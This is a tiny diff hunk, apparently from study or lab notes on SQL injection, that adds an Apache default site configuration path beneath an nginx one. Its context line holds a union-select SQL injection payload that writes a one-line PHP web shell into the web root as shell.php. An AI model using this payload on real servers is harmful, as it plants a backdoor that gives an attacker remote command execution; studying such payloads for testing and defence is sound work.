@@ -113,3 +113,4 @@ cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.
 ***
 
 /etc/nginx//sites-enabled/default
+ /etc/apache2/sites-enabled/000-default.conf
